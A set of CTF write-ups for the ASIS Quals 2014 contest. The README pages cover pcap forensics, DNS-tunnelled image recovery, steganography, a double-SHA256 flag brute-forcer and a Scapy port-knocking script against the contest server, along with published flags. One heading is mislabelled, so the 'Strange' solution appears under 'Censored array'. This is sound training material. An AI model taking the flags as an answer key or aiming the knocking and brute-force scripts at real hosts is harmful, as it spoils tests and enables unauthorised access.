**Points:** 150
**Description:**

> [file](forensic_150_d0a3ca9740270f3b30e56c9cfa3050f3)

## Write-up

Let’s see what [the provided file](forensic_150_d0a3ca9740270f3b30e56c9cfa3050f3) could be:

```bash
$ file forensic_150_d0a3ca9740270f3b30e56c9cfa3050f3
forensic_150_d0a3ca9740270f3b30e56c9cfa3050f3: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < forensic_150_d0a3ca9740270f3b30e56c9cfa3050f3 > forensic_150`
* `unxz < forensic_150_d0a3ca9740270f3b30e56c9cfa3050f3 > forensic_150`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x forensic_150_d0a3ca9740270f3b30e56c9cfa3050f3
```

Let’s find out what the extracted file is:

```bash
$ file forensic_150
forensic_150: POSIX tar archive
```

Extract the tar archive:

```bash
$ tar -vxzf forensic_150
x forensic_150_2ca7d28df77ec506efc36dd09a146b13
```

And inspect the extracted file:

```bash
$ file forensic_150_2ca7d28df77ec506efc36dd09a146b13
forensic_150_2ca7d28df77ec506efc36dd09a146b13: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
```

This is a pcap file. Let’s open it in Wireshark and fire up a packet search for the string “flag” in the packet bytes. All results seem to be comments to some HTML/JavaScript code about a boolean variable (a flag) — except for one result, which seems to be the result of a file download called `myfile`. Extracting this file from the pcap and using the Linux `file` command we see that `myfile` is actually another pcap file. However, loading it in Wireshark doesn’t seem to work — the file is broken. We ran `pcapfix` on `myfile` which succesfully repaired it so it could be opened in Wireshark. Investigating this file reveals a file upload to an HP device, most likely a printer. Again, we extract this file which resulted in a PostScript file that contained the flag in ASCII art.

## Other write-ups and resources

* <http://blog.squareroots.de/en/2014/05/asis-ctf-2014-forensic/>
* <http://tasteless.eu/2014/05/asis2014-forensic-150-forensic/>
* <http://blog.dul.ac/2014/05/ASISCTF14/>
* <http://singularityctf.blogspot.de/2014/05/asis-ctf-quals-2014-writeup-forensic.html>
# ASIS Cyber Security Contest Quals 2014: Censored array

**Category:** Crypto, PPC
**Points:** 1
**Description:**

> ```bash
> nc 87.107.123.4 9301
> ```
>
> Hint: ACL Forensic

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: Forensic 2

**Category:** Forensic
**Points:** 300
**Description:**

> [file](https://mega.co.nz/#!fk4iEJRb!hrGOlhPVyaTsskucvhCTBYEIIPIEcBXQqibGbbYPAGk) (`forensic_300_4a6f16218336d046acff450dd5570c02`; 317.4 MB)

## Write-up

(TODO)

## Other write-ups and resources

* [Indonesian](http://blog.rentjong.net/2014/05/asis-quals-2014-forensic-300.html)>
# ASIS Cyber Security Contest Quals 2014: Gas stations

**Category:** /
**Points:** 225
**Description:**

> We want to plan the placement of some gas stations, in such a way that cost of traveling between homes and nearest gas station be the least possible amount.
>
> ```bash
> nc 87.107.124.13 9302
> ```

## Write-up

(TODO)

## Other write-ups and resources

* <https://translate.google.com/translate?sl=in&tl=en&hl=en&u=http%3A%2F%2Frentjong-team.blogspot.com%2F2014%2F05%2Fasis-quals-2014-write-up-gas-stations.html>
# ASIS Cyber Security Contest Quals 2014: Hidden flag

**Category:** Web
**Points:** 75
**Description:** (none)

## Write-up

The detail page for this challenge (available only after login) sends the following HTTP headers:

```
Connection: keep-alive
Content-Encoding: gzip
Content-Language: en-us
Content-Type: text/html; charset=utf-8
Date: Sat, 10 May 2014 13:33:37 GMT
Server: nginx
Transfer-Encoding: chunked
Vary: Cookie, Accept-Language
X-Content-Type-Options: nosniff
x-flag: ASIS_b6b?244608c2?c2e869cb56?67b64?b1
X-Frame-Options: SAMEORIGIN
X-Hacker: Don't Be A Jerk
X-Powered-By: ASIS
X-XSS-Protection: 1; mode = block
```

The `x-flag: ASIS_b6b?244608c2?c2e869cb56?67b64?b1` header value looks like a flag, except four hexadecimal digits have been replaced with question marks. We’ll have to find the right combination of digits, but there are 65,536 possibilities (16 possibilities for each of the 4 digits, i.e. 16 to the power of 4). We definitely cannot submit all of these manually…

Luckily, the challenge detail page contains some JavaScript that validates the flag before submitting it to the server:

```js
$('flag_submission').submit(function(e){
  e.preventDefault();
  var shaObj = new jsSHA(document.forms["flag_submission"]["id_flag"].value, "TEXT");
  var hash = shaObj.getHash("SHA-256", "HEX");
  var shaObj2 = new jsSHA(hash, "TEXT");
  var hash2 = shaObj2.getHash("SHA-256", "HEX");
  if (document.forms["flag_submission"]["check"].value !== hash2) {
    if ($("#id_flag").next().length == 0){
      $('<div class="alert alert-danger" id="answer" />').insertAfter('#id_flag');
    }
    // …
  }
  // …
});
```

It looks like the entered flag gets hashed using SHA-256 twice, and is then compared to the `value` of the `<input>` element with `name="check"`. Let’s see what that value is:

```html
<input id="id_check" name="check" type="hidden" value="2b127c77074e44b6e74074b1eb8d32dfe27fe78e6a05e302baed68e2cc643ca1" />
```

Now that we know `2b127c77074e44b6e74074b1eb8d32dfe27fe78e6a05e302baed68e2cc643ca1` is equal to `sha256(sha256(flag))`, and that flag is some variation of `ASIS_b6b?244608c2?c2e869cb56?67b64?b1`, we can write a script to brute-force the result. Here’s a quick and dirty solution:

```python
#!/usr/bin/env python
# coding=utf-8

import hashlib
import sys

hex_digits = 'abcdef0123456789'
for a in hex_digits:
  for b in hex_digits:
    for c in hex_digits:
      for d in hex_digits:
        flag = 'ASIS_b6b%s244608c2%sc2e869cb56%s67b64%sb1' % (a, b, c, d)
        flagHash = hashlib.sha256(flag).hexdigest()
        checkHash = hashlib.sha256(flagHash).hexdigest()
        if checkHash == '2b127c77074e44b6e74074b1eb8d32dfe27fe78e6a05e302baed68e2cc643ca1':
          print 'Flag found: %s' % flag
          sys.exit()
```

Let’s run it:

```bash
$ python hidden-flag.py
Flag found: ASIS_b6be244608c27c2e869cb56167b649b1
```

The flag is `ASIS_b6be244608c27c2e869cb56167b649b1`.

## Other write-ups and resources

* <http://nickthefrost.com/2014/05/10/asis-ctf-quals-2014-hidden-flag/>
* <http://www.incertia.net/blog/asis-2014-quals-hidden-flag/>
* <http://blogs.univ-poitiers.fr/e-laize/2014/05/11/asis-2014-hiddenflag/>
* <http://tasteless.eu/2014/05/asis-ctf-quals-2014-hidden-flag-writeup/>
* <http://quangntenemy.blogspot.de/2014/05/asis-ctf-quals-2014.html>
* [Persian](http://xploit.ir/asis-2014-quals-%D9%BE%D8%B1%DA%86%D9%85-%D9%85%D8%AE%D9%81%DB%8C/)
* <http://singularityctf.blogspot.de/2014/05/first-of-all-lets-check-headersdata.html>
# ASIS Cyber Security Contest Quals 2014: Hurdling

**Category:** Web
**Points:** 150
**Description:**

> 87.107.124.20:1050
>
> Hint: Rsync
> traffic problems are intentional

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: Image

**Category:** Trivia
**Points:** 50
**Description:**

> Download the attached file and find the flag
> [file](joy_50_25b927e48a23a4b41f215303ca988a01)
> No need to calculate MD5 or appending `ASIS_`.

We are given the file `joy_50_25b927e48a23a4b41f215303ca988a01` without any extensions so the first thing we do is to run `file` command which gives us:

```bash
$ file joy_50_25b927e48a23a4b41f215303ca988a01
joy_50_25b927e48a23a4b41f215303ca988a01: xz compressed data
```

We can decompress it by running the `tar` command with the following arguments:

```bash
$ tar -xv --xz -f joy_50_25b927e48a23a4b41f215303ca988a01
1
x joy_a653520127e5147e0f9cc489ea9d1cf6
```

Running the `file` command again on extracted file gives us

```
joy_a653520127e5147e0f9cc489ea9d1cf6: iNES ROM dump, 1x16k PRG, 1x8k CHR, [Horiz.]
```

So we can rename it to add a proper extension.

```bash
$ mv joy_a653520127e5147e0f9cc489ea9d1cf6 joy_a653520127e5147e0f9cc489ea9d1cf6.nes
```

Look like we need to find ourselves a SNES emulator. There are plenty of those available on the Internet for various OSes. A good place to start for finding tools to play with ROMs is [romhacking.net](http://www.romhacking.net), on Ubuntu though we can install [bsnes](https://apps.ubuntu.com/cat/applications/bsnes/) which is available via Ubuntu Software Center.

After loading the ROM file we are presented with an old game of [Namco](http://en.wikipedia.org/wiki/Namco) - [Tank Battalion](http://en.wikipedia.org/wiki/Tank_Battalion) with some minor tweaks.

![Main Screen of the game](main-screen.png)

By playing a game and going through the first level we are shown with a map for level two.

![Level 2 map](level-2.png)

Thus the flag should be: 8BIT RULES, but it did not work.

Later (2014-05-10 01:31) during the competition the image file was [updated](trivia_50_88da3c57a7b4489036943d35d551cab2). Repeating the steps as described above gives us:

![Level 2 map altered](level-2-updated.png)

The flag is `8BIT\_RULES`.

We do not need to play the game to get to second (or in that matter to any) level. On the level selection screen we can press `X` (bind to `A` button on SNES pad) to change level to 2.

## Other write-ups and resources

* <http://nickthefrost.com/2014/05/10/asis-ctf-quals-2014-image/>
* [Indonesian](http://blog.rentjong.net/2014/05/asis-quals-2014-image-trivia-50.html)
* <http://quangntenemy.blogspot.de/2014/05/asis-ctf-quals-2014.html>
* [Persian](http://xploit.ir/asis-2014-quals-%D8%AA%D8%B5%D9%88%DB%8C%D8%B1-%D9%BE%D8%B1%D9%88%D9%86%D8%AF%D9%87/)
* <http://apelord.net/posts/asis-ctf-quals-2014-trivia-50>
# ASIS Cyber Security Contest Quals 2014: Impenetrable

**Category:** Web
**Points:** 300
**Description:**

> <http://87.107.124.13:1048>
>
> Hint: Try to log in with the username that has numbers in the beginning

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: Malware

**Category:** Reverse, PPC
**Points:** 400
**Description:**

> after running this malware, our files changed. find the flag.
> "Caution": The attached file is a malware. DO NOT run it.
> [file](re_400_a60dcaddf7430953d053d9fec5b0c932)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: MESA system

**Category:** Web
**Points:** 150
**Description:**

> Go to <http://87.107.123.4:8023/>

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: Milad Tower

**Category:** Crypto, Stego
**Points:** 150
**Description:**

> Download the attached file and find the flag
> [file](stego_150_098e541d820fc7f4aaffefd5cba866ff)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: Plough

**Category:** Crypto
**Points:** 250
**Description:**

> Source code of encryptor and encrypted file is given
> [file](crypto_250_bf16a61aa8117be9c994f171023d37ff)

## Write-up

(TODO)

## Other write-ups and resources

* <http://blogs.univ-poitiers.fr/e-laize/2014/05/11/asis-2014-plough/>
# ASIS Cyber Security Contest Quals 2014: Prying ears

**Category:** Forensic
**Points:** 175
**Description:**

> [file](forensic_175_1f352928fa34c024c9ab15d102b115ce)

## Write-up

Let’s see what [the provided file](forensic_175_1f352928fa34c024c9ab15d102b115ce) could be:

```bash
$ file forensic_175_1f352928fa34c024c9ab15d102b115ce
forensic_175_1f352928fa34c024c9ab15d102b115ce: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < forensic_175_1f352928fa34c024c9ab15d102b115ce > forensic_175`
* `unxz < forensic_175_1f352928fa34c024c9ab15d102b115ce > forensic_175`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x forensic_175_1f352928fa34c024c9ab15d102b115ce
```

Let’s find out what the extracted file is:

```bash
$ file forensic_175
forensic_175: POSIX tar archive
```

Extract the tar archive:

```bash
$ tar -vxzf forensic_175
x forensic_175_d78a42edc01c9104653776f16813d9e5
```

And inspect the extracted file:

```bash
$ file forensic_175_2ca7d28df77ec506efc36dd09a146b13
forensic_175_d78a42edc01c9104653776f16813d9e5: data
```

The file is a Pcap-ng (Wireshark) file. Running Wireshark’s protocol hierarchy on the file reveals a lot of DNS traffic.
We notice that most of this DNS traffic consists of requests to a domain name with the following format: `[0-9a-f]{14}.asis.io`. However, all of them result in a “not found” response.

Looking closer we see that all of the prefixes to `.asis.io` are hexadecimal digits. The first one is `89504e470d0a1a`, which contains the [magic number](http://en.wikipedia.org/wiki/List_of_file_signatures) for PNG (`89 50 4e 47 0d 0a 1a 0a`). So we extracted all the requests with the `[0-9a-f]{14}.asis.io` format, saved the prefixes to a file and transformed them to a PNG using:

```bash
$ xxd -r -p hex.txt out.png
```

The PNG file contained the flag.

## Other write-ups and resources

* <http://tasteless.eu/2014/05/asis2014-forensics-175-prying-ears/>
* <http://blog.dul.ac/2014/05/ASISCTF14/>
# ASIS Cyber Security Contest Quals 2014: Random Image

**Category:** Crypto
**Points:** 150
**Description:**

> Find the flag
> [file](crypto_150_8f3fd5d2bacd408904b8406c19183c23)

## Write-up

_This write-up is made by Steven of the [HacknamStyle](http://hacknamstyle.net/) CTF team._

The challenge contains this image:

![](enc.png)

…and a Python script:

```python
#!/usr/bin/env python

import Image
import random

def get_color(x, y, r):
  n = (pow(x, 3) + pow(y, 3)) ^ r
  return (n ^ ((n >> 8) << 8 ))

flag_img = Image.open("flag.png")
im = flag_img.load()
r = random.randint(1, pow(2, 256))
print flag_img.size

enc_img = Image.new(flag_img.mode, flag_img.size)
enpix = enc_img.load()

for x in range(flag_img.size[0]):
  for y in range(flag_img.size[1]):
    t = random.randint(1, pow(2, 256)) % 250
    enpix[x,y] = t


for x in range(flag_img.size[0]):
  for y in range(flag_img.size[1]):
    if im[x,y] < 250 :
      s = get_color(x, y, r)
      enpix[x,y] = s

enc_img.save('enc' + '.png')
```

The script is used to encode an image with the flag, and turns it into the given image.
Pixels with value lower than 250 are overwritten by the value generated by `get\_color(x, y, r)`.
This function generates a value based on the pixel location `(x,y)` and 256-bit random value `r`.
In `get\_color` we can see that the value is calculated by XORing the sum of the cubes of `x` and `y` with `r`, and then keeping the least significant 8 bits.

We don't have the random key `r`, but we can bruteforce it because only the least significant 8 bits are used.
For the correct version of `r`, `get\_color(x,y,r)` will generate a value that is identical to the one in [`enc.png`](enc.png).
Unfortunately, some pixels will contain random information instead (those which have values 250 and higher in the original flag image).

We give each of these 2 cases a different color. Pixels matching their `get\_pixel` value will be colored black, the rest is colored white. For each of the 256 possible values of `r`, we generate a ‘decoded’ image. By going through the image, we find that [`decoded\_38.png`](decoded_38.png) (for `r = 38`) contains the flag:

![](decoded_38.png)

[`color\_decrypto.py`](color_decrypto.py) contains the code for the solution.

## Other write-ups and resources

* <http://blog.squareroots.de/en/2014/05/asis-ctf-2014-color-crypto/>
* <http://www.incertia.net/blog/asis-2014-quals-random-image/>
* <http://blogs.univ-poitiers.fr/e-laize/2014/05/10/asis-2014-randomimage/>A
* <http://quangntenemy.blogspot.de/2014/05/asis-ctf-quals-2014.html>
* [Persian](http://xploit.ir/asis-2014-qulas-random-image/)
# ASIS Cyber Security Contest Quals 2014 write-ups

* [Main website](http://asis-ctf.ir/)
* [Scoreboard](http://asis-ctf.ir/scoreboard/) or [local alternative](scoreboard.txt)
* [@asisctf on Twitter](https://twitter.com/asisctf)

## Completed write-ups

* [Archaic](archaic)
* [Blocks](blocks)
* [forensic](forensic)
* [Forensic 2](forensic-2)
* [Hidden flag](hidden-flag)
* [Image](image)
* [prying ears](prying-ears)
* [Random Image](random-image)
* [Sound Zoo](sound-zoo)
* [Strange](strange)
* [Toq-Toq](toq-toq)
* [Trivia 1](trivia-1)
* [Trivia 2](trivia-2)
* [Undistorted History](undistorted-history)
* [White noise](white-noise)
* [Winner](winner)

## External write-ups only

* [Gas stations](gas-stations)
* [Plough](plough)
* [Serial number](serial-number)
* [Spy Paper](spy-paper)
* [Tortureous sound](tortureous-sound)

## Missing write-ups

* [Auth](auth)
* [Bomb](bomb)
* [Bonus](bonus)
* [Censored array](censored-array)
* [Easy Reading](easy-reading)
* [ECC](ecc)
* [Forensic 100](forensic-100)
* [Hurdling](hurdling)
* [Impenetrable](impenetrable)
* [Malware](malware)
* [MESA system](mesa-system)
* [Milad Tower](milad-tower)
* [Teleport](teleport) TODO
* [weak password](weak-password)
# ASIS Cyber Security Contest Quals 2014: Serial number

**Category:** Reverse
**Points:** 300
**Description:**

> [file](re_300_75df11d547b3419c0da22b626b7e560e)

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.ztrix.me/blog/2014/05/10/asis-quals-2014-serial-number-writeup/>
# ASIS Cyber Security Contest Quals 2014: Sound Zoo

**Category:** Stego
**Points:** 150
**Description:**

> [file](steg_150_e3cdf499ed8341fe750530b93b6ff816)

## Write-up

Let’s see what [the provided file](steg_150_e3cdf499ed8341fe750530b93b6ff816) could be:

```bash
$ file steg_150_e3cdf499ed8341fe750530b93b6ff816
steg_150_e3cdf499ed8341fe750530b93b6ff816: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < steg_150_e3cdf499ed8341fe750530b93b6ff816 > stego_150`
* `unxz < steg_150_e3cdf499ed8341fe750530b93b6ff816 > stego_150`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x steg_150_e3cdf499ed8341fe750530b93b6ff816
```

Let’s find out what the extracted file is:

```bash
$ file stego_150
stego_150: POSIX tar archive
```

Extract the tar archive:

```bash
$ tar -vxzf stego_150
x steg_150_ccf8db5e8cf287469ed291212577f032
```

And inspect the extracted file:

```bash
$ file steg_150_ccf8db5e8cf287469ed291212577f032
steg_150_ccf8db5e8cf287469ed291212577f032: Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, JntStereo
```

Okay, so it’s an MP3 file that seems to contain a series of engine sounds followed by a computer voice. The computer voice seems to be slowed down though. Open the file in Audacity, go to Effect → Tempo and increase the tempo to 1100% to hear the computer voice reading a code:

```
bbe60b482d22ea98a4d0ef205f772a8b
```

Since the CTF rules state that each flag is of the format `ASIS_x` where `x` is an MD5 hash unless explicitly stated otherwise, the flag is `ASIS_bbe60b482d22ea98a4d0ef205f772a8b`.

## Other write-ups and resources

* [Persian](http://xploit.ir/asis-2014-quals-%D8%A8%D8%A7%D8%BA-%D9%88%D8%AD%D8%B4-%D8%B5%D8%AF%D8%A7/)
# ASIS Cyber Security Contest Quals 2014: Spy Paper

**Category:** Stego, Forensic
**Points:** 100
**Description:**

> Download the attached file.
> Calculate MD5 of the result and append it after `ASIS_`.
> [file](stego_100_7181a9caf2a2aff628ae86b2e9ccb22b)

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/05/asis2014-stego-100-spy-paper/>
* <http://quangntenemy.blogspot.de/2014/05/asis-ctf-quals-2014.html>
# ASIS Cyber Security Contest Quals 2014: Censored array

**Category:** Crypto, PPC
**Points:** 1
**Description:**

> ```bash
> nc 87.107.123.4 9301
> ```

## Write-up

```
$ file crypto_100_0846ec09aab1276d3f58132e9e0d9040
crypto_100_0846ec09aab1276d3f58132e9e0d9040: xz compressed data
$ tar xJvf crypto_100_0846ec09aab1276d3f58132e9e0d9040
x 1c2a7ff1d5cdf3d36544551ae18e30c8
$ file 1c2a7ff1d5cdf3d36544551ae18e30c8
1c2a7ff1d5cdf3d36544551ae18e30c8: ASCII text, with very long lines
$ cat 1c2a7ff1d5cdf3d36544551ae18e30c8
193783664954325860839119335839123899215102615420822972351760578005089136540425309354036361893838393003588891746622376179640815659427394332341396349623915618698881917748452642227703372088122750038977875271898725946720852004880885256474153240496403679762658175476439747881512983568010339887513815290532457778339653199840844995620334862083972129131373571189257219076954184188287439143813927696901842427070726653570329826784994939781399262722041373098152896420678252225833798975089624831218241591628711120707329895543671411906901315360684109949162093034473760905475852393975531277897806950327343042645059549958465853312789713887760614613019996408541328573908373854848160937603498857471516627134163969286531049737140365371424114198553258003189099111625628658195048410056477354418943486633764457994737288416245326617781808808365823018019007303548026276450867096742624996960312090440565297914562234479315177247633875823205403409920418528411649247750473506398553163169161650499998659753179520467576895466482641387252430718673195843748651606278144
```
So we've got a big integer, let's convert it to hex and save it as a file.
```
$ python bignum2hex.py ./1c2a7ff1d5cdf3d36544551ae18e30c8
$ file out.hex
out.hex: 7-zip archive data, version 0.3
$ xxd -l16 out.hex
0000000: 377a bcaf 271c 0003 b73b 9b2c 3f01 0000  7z..'....;.,?...
```

Note the [header/file signature](http://www.garykessler.net/library/file_sigs.html) for a 7z compressed file: `377A BCAF 271C`. Let's extract it.

```
$ 7z e out.hex
7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: out.hex

Extracting  strange

Everything is Ok

Size:       354
Compressed: 431
$ file strange
strange: lzop compressed data - version 1.030, LZO1X-999, os: Unix
```

Another compression algorithmn, [LZO](http://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Oberhumer). Let's extract it again.

```
$ lzop -dvN strange
decompressing strange into strange.uu
$ file strange.uu
strange.uu: uuencoded or xxencoded text
```

This CTF realy likes to compress, encode and archive. This time, it's [UUEncoding](http://en.wikipedia.org/wiki/Uuencoding). Let's decode it.

```
$ uudecode strange.uu 
$ file strange.U
strange.U: ASCII text
$ cat strange.U
fe18be6a597ffad862b3e8acf9afacb6b6a781efa67acb1a81efad85ab7e
ca8bbe85abdefa7a2dfac79e9fe6de7e8adeffeb617be7e56a0fa2b3e012
212fae9dd7abb1ca2b7bee1bf38d79d5fd7bfb4774ef6db8fbde7b79af1e
6be79ae1a7f4
```

Looks like a hexdump. Let's convert this hexdump to binary.

```
$ xxd -r -p strange.U > strange.bin
$ file strange.bin
strange.bin: data
$ xxd -l16 strange.bin
0000000: fe18 be6a 597f fad8 62b3 e8ac f9af acb6  ...jY...b.......
```

We can't find any header/file signature that matches these first bytes of `strange.bin`. Let's encode it, maybe we get lucky.

```
$ base64 -i strange.bin -o strange.bin.b64
$ file strange.bin.b64
strange.bin.b64: ASCII text
$ cat strange.bin.b64
/hi+all/+this+is+a+strange+message+that+you+have+not+seen+before/+the+flag+is+ASIS+underscore+4b84151f17+0d07224+957ea8ea+ea4af0
```

We had luck. As the original writeup states, the last character of the flag `ASIS\_4b84151f170d07224957ea8eaea4af0` is missing and had to be reconstructed. Read more [here](http://blogs.univ-poitiers.fr/e-laize/2014/05/11/asis-2014-strange/).

## Other write-ups and resources

* <http://blogs.univ-poitiers.fr/e-laize/2014/05/11/asis-2014-strange/># ASIS Cyber Security Contest Quals 2014: Toq-Toq

**Category:** Forensic
**Points:** 100
**Description:**

> [file](forensic_100_c920dfa687ed1bf550783407025586f1)

## Write-up

[The provided file](forensic_100_c920dfa687ed1bf550783407025586f1) contains a pcap file. After a quick packet search with Wireshark for the string `flag` in the packet bytes we found some directory listings of a web server, each serving a part of the flag. Here’s all of them:

```html
<li><a href="first_part_of_flag">first_part_of_flag</a>
<li><a href="second_part_of_flag">second_part_of_flag</a>
<li><a href="third_part_of_flag">third_part_of_flag</a>
<li><a href="fourth_part_of_flag">fourth_part_of_flag</a>
<li><a href="last_part_of_flag">last_part_of_flag</a>
```

Sadly, navigating to these pages with a web browser results in a timeout.

Then we thought the “toq toq” challenge name might be a wordplay on “knock knock”, so [port knocking](http://en.wikipedia.org/wiki/Port_knocking) might be needed to open the ports to the webservers.

Using the Wireshark filter `ip.dst==87.107.123.4` a pattern emerges. Right before the webserver is contacted for each request, multiple SYN packets are sent to different ports. Feeding these port sequences to a port knocking script indeed opens the ports which allows us to capture the flag.

Here’s the script we used:

```python
#!/usr/bin/python
# modified version of Eindbazen’s port knocking script

from scapy.all import *
import urllib2

host = "87.107.123.4"

def doPortKnocking(ports, weburl):
  conf.verb = 0
  for dport in range(0, len(ports)):
    #print "[*] Knocking on "+host+": " , ports[dport]
    ip = IP(dst=host)
    port = 39367
    SYN = ip/TCP(sport=port, dport=ports[dport], flags="S", window=2048, options=[('MSS',1460)], seq=0)
    send(SYN)
  response = urllib2.urlopen(weburl)
  html = response.read()
  print html
  response.close() # best practice to close the file

ports = [9264, 11780, 2059, 8334]
print "First part:"
doPortKnocking(ports, 'http://87.107.123.4:24931/first_part_of_flag')

ports = [42304, 53768, 3297, 8334]
print "Second part:"
doPortKnocking(ports, 'http://87.107.123.4:19760/second_part_of_flag')

ports = [23106, 4250, 62532, 11655, 33844]
print "Third part:"
doPortKnocking(ports, 'http://87.107.123.4:3695/third_part_of_flag')

ports = [49377, 48116, 54900, 8149]
print "Fourth part:"
doPortKnocking(ports, 'http://87.107.123.4:31054/fourth_part_of_flag')

ports = [16340, 59991, 37429, 60012, 15397, 21864, 12923, 8799]
print "Last part:"
doPortKnocking(ports, 'http://87.107.123.4:8799/last_part_of_flag')
```

Alternatively, [the `knock` command-line utility](http://www.zeroflux.org/projects/knock) can be used to perform the port knocking.

## Other write-ups and resources

* <http://blog.dul.ac/2014/05/ASISCTF14/>
* [Indonesian](http://blog.rentjong.net/2014/05/toq-toq-forensic100.html)
# ASIS Cyber Security Contest Quals 2014: Tortureous sound

**Category:** Trivia, Stego
**Points:** 75
**Description:**

> Listen to the attached file and find the flag
> [file](stego_75_5ecb5b98aa04033a9855416daed603c8)

## Write-up

Let’s see what [the provided file](stego_75_5ecb5b98aa04033a9855416daed603c8) could be:

```bash
$ file stego_75_5ecb5b98aa04033a9855416daed603c8
stego_75_5ecb5b98aa04033a9855416daed603c8: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < stego\_75\_5ecb5b98aa04033a9855416daed603c8 > stego\_75`
* `unxz < stego\_75\_5ecb5b98aa04033a9855416daed603c8 > stego\_75`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x stego_75_5ecb5b98aa04033a9855416daed603c8
```

Let’s find out what the extracted file is:

```bash
$ file stego_75
stego_75: POSIX tar archive (GNU)
```

Okay, let’s extract the tar archive:

```bash
$ tar -xvf stego_75
x stego_75_111cbfefb1af0175b73d8800ba187ebc
```

…and figure out what the extracted file is:

```bash
$ file stego_75_111cbfefb1af0175b73d8800ba187ebc
stego_75_111cbfefb1af0175b73d8800ba187ebc: ISO Media, MPEG v4 system, version 2
```

Opening the file in Audacity reveals that it is indeed an audio file with 6 channels.

(TODO)

## Other write-ups and resources

* <http://blog.squareroots.de/en/2014/05/asis-ctf-2014-tortureous-sound/>
* <http://www.incertia.net/blog/asis-2014-quals-tortureous-sound/>
* [Persian](http://xploit.ir/asis-quals-2014-%D8%B5%D8%AF%D8%A7%DB%8C-%DA%AF%D9%88%D8%B4-%D8%AE%D8%B1%D8%A7%D8%B4/)
# ASIS Cyber Security Contest Quals 2014: Trivia 1

**Category:** Trivia
**Points:** 10
**Description:**

> Then he said: Thou shalt not send packets, that do not conform to the specification, yet thou shalt accept them, if you can understand their meaning.
> Do not calculate MD5 or add `ASIS_`

## Write-up

This sounds like [the robustness principle](http://en.wikipedia.org/wiki/Robustness_principle), also known as Postel’s law.

The flag is `Postel's law`.

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: Trivia 2

**Category:** Trivia
**Points:** 60
**Description:**

> Downtime caused to a website by massive referrals from another popular site.
> Do not calculate MD5 or add `ASIS_`.

## Write-up

The flag is [`Slashdot effect`](http://en.wikipedia.org/wiki/Slashdot_effect).

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: Undistorted History

**Category:** Trivia
**Points:** 1
**Description:**

> What is the name of this place?
> No need to calculate MD5 or appending `ASIS_`.

## Write-up

Checking the location on the map view ![Image](undistorted_history.png) revealed that the Challenge was located at the Persian Gulf.

The flag is `Persian Gulf`.

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: weak password

**Category:** Web
**Points:** 150
**Description:**

> <https://87.107.124.21:1443>

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: White noise

**Category:** Stego
**Points:** 175
**Description:**

> [file](steg_250_8be7a320b7cbc2696f352cb42e717a0b)

## Write-up

The file seems to be a `tar.xz` container (`file steg_250_8be7a320b7cbc2696f352cb42e717a0b`). So we use `tar -xf steg_250_8be7a320b7cbc2696f352cb42e717a0b`.

The extracted file seems to be a PNG – just a random noise picture. Using `pnginfo` tells us this:

```bash
$ pnginfo steg_250_958a0ad74c8f0e07adb6c92672490b72
Image Width: 256 Image Length: 256
Bitdepth (Bits/Sample): 8
Channels (Samples/Pixel): 3
Pixel depth (Pixel Depth): 24
Colour Type (Photometric Interpretation): RGB
Image filter: Single row per byte filter
Interlacing: No interlacing
Compression Scheme: Deflate method 8, 32k window
Resolution: 0, 0 (unit unknown)
FillOrder: msb-to-lsb
Byte Order: Network (Big Endian)
Number of text strings: 0 of 0
```

Nothing useful. Let’s start looking at the RGB values of each pixel using a Python script:

```python
from PIL import Image

im = Image.open("foto.png")
rgb_im = im.convert('RGB')
#size is 256 by 256
for x in xrange(0,255):
  for y in xrange(0,255):
    r, g, b = rgb_im.getpixel((x, y))
    print str(r) + " " + str(g) + " " + str(b)
```

The output is:

```
R   G   B
128 80 239
128 171 83
128 165 100
128 136 219
128 165 161
128 68 224
128 119 60
…
```

All the `R`’s are 128, so probably not important. Let’s export all the `G`’s and `B`’s only, like this:

```python
from PIL import Image

im = Image.open("foto.png")
rgb_im = im.convert('RGB')
#size is 256 by 256
for x in xrange(0,255):
  for  y in xrange(0,255):

    r, g, b = rgb_im.getpixel((x, y))
    print "(" str(g) + ";" + str(b) + ")"
```

…it gives us this kind of output:

```
(80;239)
(171;83)
(165;100)
(136;219)
(165;161)
(68;224)
(119;60)
(171;162)
…
```

When using the first 10000 points as coordinates on a scatter-plot (I used Excel 2013 to do this), the following becomes visible:

![](flag.png)

When rotating this picture the flag becomes visible: `ASIS\_329afbd5ba6fc8b1df15e886edbdcc25`.

Only 4 teams managed to solve this challenge.

## Other write-ups and resources

* <http://quangntenemy.blogspot.de/2014/05/asis-ctf-quals-2014.html>
# ASIS Cyber Security Contest Quals 2014: Winner

**Category:** Trivia
**Points:** 20
